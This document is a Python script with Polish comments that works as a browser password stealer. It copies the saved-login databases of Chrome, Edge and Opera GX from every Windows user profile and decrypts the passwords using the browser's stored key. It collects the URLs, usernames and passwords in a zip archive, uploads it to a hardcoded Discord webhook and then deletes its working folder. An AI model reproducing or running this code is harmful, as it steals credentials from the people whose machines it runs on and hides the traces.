import os
import shutil
import zipfile
import requests
import json
import base64
from Cryptodome.Cipher import AES

# URL webhooka Discorda
webhook_url = "https://discord.com/api/webhooks/1322292531374854224/Fdl-C9RgDUxDtK2bFQXPpRx5G_jGHjy2cNJ-k7_4O4kUAIfJaIZLOTz2JUSLon5QBOGe"

# Ścieżka do katalogu z użytkownikami
users_directory = r"C:\\Users"

# Ścieżka folderu roboczego
working_dir = r"C:\\Users\\Public\\Temp_Login_Data"
os.makedirs(working_dir, exist_ok=True)

# Lista folderów aplikacji
login_data_paths = {
    "Opera GX": r"AppData\\Roaming\\Opera Software\\Opera GX Stable",
    "Google Chrome": r"AppData\\Local\\Google\\Chrome\\User Data\\Default",
    "Microsoft Edge": r"AppData\\Local\\Microsoft\\Edge\\User Data\\Default"
}

# Funkcja do wysyłania pliku na Discord
def send_file_to_discord(file_path, webhook_url):
    try:
        with open(file_path, "rb") as file:
            response = requests.post(
                webhook_url,
                files={"file": file},
                data={"content": f"Wysłano pliki: {file_path}"}
            )
        if response.status_code == 200:
            print(f"Plik {file_path} wysłany na Discord.")
        else:
            print(f"Błąd przy wysyłaniu {file_path}: {response.status_code} - {response.text}")
    except Exception as e:
        print(f"Błąd przy wysyłaniu pliku {file_path}: {e}")

# Funkcja do odszyfrowywania haseł
def decrypt_password(encrypted_password, key):
    try:
        iv = encrypted_password[3:15]
        payload = encrypted_password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted_password = cipher.decrypt(payload).decode('utf-8')
        return decrypted_password
    except Exception as e:
        return f"Błąd odszyfrowywania: {e}"

# Funkcja do wyciągania klucza szyfrującego
def extract_key(local_state_path):
    try:
        with open(local_state_path, "r", encoding="utf-8") as file:
            local_state = json.load(file)
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        key = encrypted_key[5:]
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
    except Exception as e:
        print(f"Błąd podczas wyciągania klucza szyfrującego: {e}")
        return None

# Funkcja do odczytywania danych logowania
def read_login_data(login_data_path, key):
    import sqlite3
    logins = []
    try:
        conn = sqlite3.connect(login_data_path)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        for row in cursor.fetchall():
            url, username, encrypted_password = row
            decrypted_password = decrypt_password(encrypted_password, key)
            logins.append((url, username, decrypted_password))
        conn.close()
    except Exception as e:
        print(f"Błąd podczas odczytywania danych logowania: {e}")
    return logins

# Funkcja do przeszukiwania folderów użytkowników i zbierania plików Login Data
def search_and_process_login_data():
    zip_file_path = os.path.join(working_dir, "Login_Data_Archive.zip")
    decrypted_data_path = os.path.join(working_dir, "Decrypted_Logins.txt")

    with open(decrypted_data_path, "w", encoding="utf-8") as output_file:
        for username in os.listdir(users_directory):
            user_folder = os.path.join(users_directory, username)

            if os.path.isdir(user_folder) and username not in ["Default", "Default User", "All Users", "Public"]:
                print(f"Przeszukiwanie folderu: {username}")

                for app_name, relative_path in login_data_paths.items():
                    app_folder = os.path.join(user_folder, relative_path)
                    login_data_path = os.path.join(app_folder, "Login Data")
                    local_state_path = os.path.join(app_folder, "Local State")

                    if os.path.exists(login_data_path) and os.path.exists(local_state_path):
                        print(f"Znaleziono dane logowania w {app_name} dla użytkownika {username}.")

                        # Kopiowanie plików do folderu roboczego
                        temp_login_data_path = os.path.join(working_dir, f"{username}_{app_name}_Login_Data")
                        temp_local_state_path = os.path.join(working_dir, f"{username}_{app_name}_Local_State")
                        shutil.copy2(login_data_path, temp_login_data_path)
                        shutil.copy2(local_state_path, temp_local_state_path)

                        # Odszyfrowywanie danych logowania
                        key = extract_key(temp_local_state_path)
                        if key:
                            logins = read_login_data(temp_login_data_path, key)
                            for url, username, password in logins:
                                output_file.write(f"URL: {url}\nUsername: {username}\nPassword: {password}\n\n")

    # Tworzenie pliku ZIP
    with zipfile.ZipFile(zip_file_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, _, files in os.walk(working_dir):
            for file in files:
                zipf.write(os.path.join(root, file), arcname=file)

    # Wysyłanie pliku ZIP na Discord
    send_file_to_discord(zip_file_path, webhook_url)

    # Czyszczenie folderu roboczego
    shutil.rmtree(working_dir)

# Uruchomienie skryptu
search_and_process_login_data()
